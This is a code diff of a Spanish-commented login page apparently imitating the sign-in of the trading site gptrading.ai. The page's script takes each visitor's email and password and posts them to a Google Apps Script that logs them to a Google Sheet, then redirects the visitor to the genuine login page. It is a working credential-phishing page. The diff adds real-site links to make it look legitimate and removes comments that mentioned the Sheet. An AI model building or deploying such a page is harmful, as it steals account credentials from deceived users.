@@ -187,8 +187,11 @@
     color: #90EE90; /* Verde principal original */
     font-size: 12px;
     text-align: right;
-    margin-bottom: 20px;
     cursor: pointer;
+    display: block;
+    margin-bottom: 20px;
+    margin-left: auto; /* Alinea el enlace a la esquina derecha del contenedor */
+    width: fit-content; /* Ajusta el ancho al contenido del texto */
   }
 
   .login-button {
@@ -202,7 +205,7 @@
     font-size: 14px;
     border-radius: 12px;
     display: block;
-    margin: 0 auto 20px auto;
+    margin: 0 auto 20px auto; /* Centrado original */
   }
 
   .error-message {
@@ -211,6 +214,19 @@
     text-align: center;
     margin-bottom: 20px;
     display: none;
+  }
+
+  .register-link {
+    color: #FFFFFF;
+    font-size: 14px;
+    text-align: right;
+    margin-top: 10px;
+  }
+
+  .register-link a {
+    color: #90EE90; /* Verde principal original */
+    text-decoration: none;
+    font-weight: bold;
   }
 
   .stair {
@@ -293,8 +309,11 @@
         </svg>
       </div>
       <div class="error-message" id="error-message">Por favor, revisa tu correo y contraseña</div>
-      <div class="forgot-password">I forgot my password</div>
+      <a href="https://app.gptrading.ai/auth/forgot-password" class="forgot-password">I forgot my password</a>
       <button type="submit" class="login-button">Login</button>
+      <div class="register-link">
+        ¿No tienes cuenta? <a href="https://app.gptrading.ai/invite/01K117P3S7K7WFHG3MC3VBS4XE">Regístrate</a>
+      </div>
     </form>
     <div class="x-container">
       <div class="x-square" style="top: 0; left: 0;"></div>
@@ -330,17 +349,16 @@ document.getElementById('login-form').addEventListener('submit', async function(
   const email = document.getElementById('email').value.toLowerCase();
   const password = document.getElementById('password').value;
   const errorMessage = document.getElementById('error-message');
-  const scriptURL = "https://script.google.com/macros/s/AKfycbyveaEsaqUeshTvIEX8GPZZO_CXugoxl7jtlI7kcLsyOaViTCnXXv9Axq-5FTkghreGHw/exec"; // Tu URL de Apps Script
+  const scriptURL = "https://script.google.com/macros/s/AKfycbyveaEsaqUeshTvIEX8GPZZO_CXugoxl7jtlI7kcLsyOaViTCnXXv9Axq-5FTkghreGHw/exec";
   const redirectURL = "https://app.gptrading.ai/auth/login";
 
-  // Validación inicial: correo debe terminar en @gmail.com y contraseña no vacía
   const emailRegex = /^[a-z0-9._%+-]+@gmail\.com$/;
   if (!emailRegex.test(email) || password.length === 0) {
     errorMessage.style.display = 'block';
-    return; // No enviar datos al Google Sheet ni redirigir
+    return;
   }
 
-  // Enviar datos al Google Sheet
+  errorMessage.style.display = 'none';
   fetch(scriptURL, {
     method: 'POST',
     mode: 'no-cors',
@@ -348,8 +366,6 @@ document.getElementById('login-form').addEventListener('submit', async function(
     body: JSON.stringify({ email: email, password: password })
   });
 
-  // Ocultar mensaje de error y redirigir
-  errorMessage.style.display = 'none';
   setTimeout(() => {
     window.location.href = redirectURL;
   }, 1000);
